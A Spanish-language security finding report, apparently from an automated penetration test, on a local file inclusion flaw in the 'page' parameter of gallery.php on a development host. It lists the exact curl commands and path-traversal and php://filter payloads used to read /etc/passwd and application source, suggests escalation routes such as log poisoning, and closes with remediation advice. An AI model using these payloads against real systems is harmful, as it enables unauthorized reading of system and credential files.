# Informe LFI - Galería de Arte Virtual

Fecha: 2026-04-27T16:36:18Z
Objetivo: http://web.dev.local:8081
VULN_FOUND: true
VULN_EXPLOITED: true

## Resumen
Se detectó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php que permite leer ficheros locales del servidor web.

## URL vulnerable
- http://web.dev.local:8081/gallery.php?page=<payload>
- Parámetro afectado: page

## Comandos exactos usados
- curl -s --path-as-is "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
- curl -s --path-as-is "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"

## Payloads probados (ejemplos)
- ../../../../etc/passwd
- ../../../../../../etc/passwd
- ../../../etc/passwd
- ..%2f..%2f..%2f..%2fetc/passwd
- /../../../../etc/passwd
- php://filter/read=convert.base64-encode/resource=/etc/passwd
- php://filter/read=convert.base64-encode/resource=gallery.php

## Impacto
- Lectura de ficheros del sistema desde la aplicación web. Se pudo extraer/visualizar contenido de /etc/passwd, lo que confirma LFI.
- Posible acceso a otros ficheros sensibles (ej. /etc/shadow, claves privadas) si los permisos son inseguros o mediante técnicas adicionales (log poisoning, wrappers, inclusion de /proc/self/environ).

## Recomendaciones
- Validar y sanitizar el parámetro "page" evitando incluir rutas o esquemas (bloquear 'php://').
- Utilizar listas blancas de ficheros permitidos en lugar de concatenar rutas proporcionadas por el usuario.
- Ejecutar el servidor web con el menor privilegio posible y corregir permisos de ficheros sensibles.
